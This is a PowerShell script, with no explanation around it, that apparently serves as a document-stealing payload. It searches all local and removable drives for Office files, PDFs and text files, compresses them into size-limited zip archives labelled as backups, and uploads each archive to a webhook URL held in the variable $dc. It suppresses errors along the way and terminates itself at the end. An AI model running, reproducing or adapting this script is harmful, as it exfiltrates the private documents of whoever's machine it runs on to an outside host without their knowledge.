[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName System.IO.Compression.FileSystem

$WebhookUrl = $dc
$MaxZipSize = 7MB
$OutputPath = "$env:TEMP\BackupDocs"
$Extensions = @("*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.pdf", "*.txt", "*.rtf")
$ExcludedDirs = @("C:\Windows", "C:\Program Files", "C:\Program Files (x86)", "C:\ProgramData")

if (-not (Test-Path $OutputPath)) {
    New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
}

$Drives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -in 2, 3 } | Select-Object -ExpandProperty DeviceID
$Files = @()

foreach ($Drive in $Drives) {
    foreach ($Ext in $Extensions) {
        try {
            $items = Get-ChildItem -Path "$Drive\" -Recurse -Include $Ext -ErrorAction SilentlyContinue -Force |
                Where-Object {
                    -not $_.PSIsContainer -and ($ExcludedDirs -notcontains $_.DirectoryName)
                }
            $Files += $items
        } catch {}
    }
}

$ZipCounter = 1
$CurrentZipSize = 0
$CurrentFiles = @()
$ZipFiles = @()

function Create-ZipFile {
    param($FileList, $ZipPath)
    if (Test-Path $ZipPath) { Remove-Item $ZipPath -Force }
    $zip = [System.IO.Compression.ZipFile]::Open($ZipPath, 'Create')
    foreach ($f in $FileList) {
        try {
            [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $f.FullName, $f.Name, [System.IO.Compression.CompressionLevel]::Optimal)
        } catch {}
    }
    $zip.Dispose()
}

foreach ($File in $Files) {
    $FileSize = $File.Length
    if ($CurrentZipSize + $FileSize -gt $MaxZipSize -and $CurrentFiles.Count -gt 0) {
        $ZipName = Join-Path $OutputPath "Backup_$ZipCounter.zip"
        Create-ZipFile -FileList $CurrentFiles -ZipPath $ZipName
        $ZipFiles += $ZipName
        $ZipCounter++
        $CurrentZipSize = 0
        $CurrentFiles = @()
    }
    $CurrentFiles += $File
    $CurrentZipSize += $FileSize
}

if ($CurrentFiles.Count -gt 0) {
    $ZipName = Join-Path $OutputPath "Backup_$ZipCounter.zip"
    Create-ZipFile -FileList $CurrentFiles -ZipPath $ZipName
    $ZipFiles += $ZipName
}

foreach ($ZipFile in $ZipFiles) {
    if (-not (Test-Path $ZipFile)) { continue }
    if ((Get-Item $ZipFile).Length -gt 8MB) { continue }

    try {
        $FileBytes = [System.IO.File]::ReadAllBytes($ZipFile)
        $FileName = [System.IO.Path]::GetFileName($ZipFile)
        $boundary = [System.Guid]::NewGuid().ToString()
        $bodyLines = @(
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"$FileName`"",
            "Content-Type: application/octet-stream",
            "",
            [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($FileBytes),
            "--$boundary--"
        ) -join "`r`n"

        Invoke-WebRequest -Uri $WebhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
    } catch {}
}

Stop-Process -Id $PID
